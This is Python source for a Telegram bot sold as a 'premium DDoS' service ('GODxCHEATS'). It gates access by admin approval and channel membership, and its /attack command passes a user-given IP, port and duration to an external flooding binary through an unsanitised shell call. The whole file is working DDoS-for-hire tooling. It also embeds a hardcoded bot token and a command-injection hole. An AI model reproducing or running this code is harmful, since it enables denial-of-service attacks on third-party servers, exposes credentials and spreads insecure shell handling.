import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import os
from datetime import datetime, timedelta

# Configuration
TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Replace with your Telegram Bot Token
ADMIN_USER_ID = 1662672529  # Replace with the admin's user ID
APPROVED_IDS_FILE = 'approved_ids.txt'
ATTACK_STATS_FILE = 'attack_stats.txt'
CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
MAX_ATTACKS_PER_USER = 5
attack_in_progress = False
cooldown_data = {}  # Stores cooldown timestamps for users
attack_counts = {}  # Stores how many attacks each user has performed

# Check if the token is set
if not TELEGRAM_BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set. Please set the token and try again.")

# Load and Save Functions for Approved IDs
def load_approved_ids():
    try:
        with open(APPROVED_IDS_FILE, 'r') as file:
            return set(line.strip() for line in file.readlines())
    except FileNotFoundError:
        return set()

def save_approved_ids():
    with open(APPROVED_IDS_FILE, 'w') as file:
        file.write("\n".join(approved_ids))

def load_attack_stats():
    try:
        with open(ATTACK_STATS_FILE, 'r') as file:
            return {line.split()[0]: int(line.split()[1]) for line in file.readlines()}
    except FileNotFoundError:
        return {}

def save_attack_stats():
    with open(ATTACK_STATS_FILE, 'w') as file:
        for user_id, count in attack_counts.items():
            file.write(f"{user_id} {count}\n")

approved_ids = load_approved_ids()
attack_counts = load_attack_stats()

# Helper Function: Check User Permissions
async def is_admin(chat_id):
    return chat_id == ADMIN_USER_ID

async def is_member_of_channel(user_id: int, context: CallbackContext):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except Exception:
        return False

# Helper Function: Cooldown Logic
def can_attack(user_id, attack_duration):
    attack_duration = int(attack_duration)

    if attack_duration > 300:
        return False, "*⚠️ Maximum attack duration is 300 seconds.*"

    if user_id not in cooldown_data:
        cooldown_data[user_id] = datetime.now()
        return True, None

    last_attack_time = cooldown_data[user_id]
    cooldown_period = timedelta(seconds=attack_duration)

    if datetime.now() - last_attack_time >= cooldown_period:
        cooldown_data[user_id] = datetime.now()
        return True, None

    return False, "*⚠️ Cooldown period has not passed yet.*"

# Commands
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your image URL
    message = (
        "*WELCOME TO GODxCHEATS DDOS*\n\n"
        "*PREMIUM DDOS BOT*\n"
        "*Owner*: @GODxAloneBOY\n"
        f"🔔 *Join our channel*: {CHANNEL_ID} to use advanced features.\n\n"
        "Use /help to see available commands."
    )
    await context.bot.send_photo(chat_id=chat_id, photo=image_url, caption=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*Available Commands:*\n\n"
        "/start - Start the bot and get a welcome message.\n\n"
        "/help - Show this help message.\n\n"
        "/approve <id> - Approve a user or group ID (admin only).\n\n"
        "/remove <id> - Remove a user or group ID (admin only).\n\n"
        "/details - Show attack stats (admin only).\n\n"
        "/attack <ip> <port> <time> - Launch an attack (approved users only).\n"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /approve <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()

    if not target_id.lstrip('-').isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid ID format. Must be a numeric ID.*", parse_mode='Markdown')
        return

    approved_ids.add(target_id)
    save_approved_ids()

    await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} approved.*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /remove <id>*", parse_mode='Markdown')
        return

    target_id = args[0].strip()
    if target_id in approved_ids:
        approved_ids.remove(target_id)
        save_approved_ids()
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ ID {target_id} removed.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ ID {target_id} is not approved.*", parse_mode='Markdown')

async def details(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if not await is_admin(chat_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Only admins can use this command.*", parse_mode='Markdown')
        return

    if not attack_counts:
        await context.bot.send_message(chat_id=chat_id, text="*No attack stats found.*", parse_mode='Markdown')
        return

    stats_message = "*Attack Stats:*\n\n"
    for user_id, count in attack_counts.items():
        remaining_attacks = MAX_ATTACKS_PER_USER - count if user_id != str(ADMIN_USER_ID) else "Unlimited"
        stats_message += f"User ID: {user_id}, Attacks: {count}, Remaining: {remaining_attacks}\n"
    
    await context.bot.send_message(chat_id=chat_id, text=stats_message, parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    user_username = update.effective_user.username  # Get the username of the user
    args = context.args

    if str(chat_id) not in approved_ids and str(user_id) not in approved_ids:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
        return

    if not await is_member_of_channel(user_id, context):
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You must join our channel ({CHANNEL_ID}) to use this feature.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*Usage: /attack <ip> <port> <time>*", parse_mode='Markdown')
        return

    ip, port, time = args
    if not time.isdigit():
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack time must be a number!*", parse_mode='Markdown')
        return

    # Check cooldown logic based on attack time
    can_attack_now, error_message = can_attack(user_id, time)
    if not can_attack_now:
        await context.bot.send_message(chat_id=chat_id, text=error_message, parse_mode='Markdown')
        return

    # Check if attack limit is reached
    if str(user_id) in attack_counts and attack_counts[str(user_id)] >= MAX_ATTACKS_PER_USER and user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You have exceeded the attack limit.*", parse_mode='Markdown')
        return

    attack_counts[str(user_id)] = attack_counts.get(str(user_id), 0) + 1
    save_attack_stats()

    # Send attack launching message with image URL
    image_url = "https://t.me/jwhu7hwbsnn/122"  # Replace with your image URL
    await context.bot.send_photo(
        chat_id=chat_id, 
        photo=image_url, 
        caption=(
            f"*💥 ATTACK INITIATED! 💥*\n\n"
            f"*🎯 TARGET IP:* {ip}\n"
            f"*🔌 TARGET PORT:* {port}\n"
            f"*⏱ ATTACK TIME:* {time} seconds\n"
            f"*👤 LAUNCHED BY:* @{user_username}\n"
            f"⚡ *Attack in progress...* ⚡\n\n"
            f"Please wait for the attack to complete. Stay tuned!"
        ), parse_mode='Markdown')

    # Simulate attack process
    await run_attack(chat_id, ip, port, time, context, user_username)

async def run_attack(chat_id, ip, port, time, context, user_username):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {time} 500",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id, 
            text=(
                f"*💚 ATTACK FINISHED 💚*\n"
                f"*🎉 The attack was completed by @{user_username}!*\n"
                f"*👍 Owner :- @GODxAloneBOY*"
            ), 
            parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("details", details))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == "__main__":
    main()
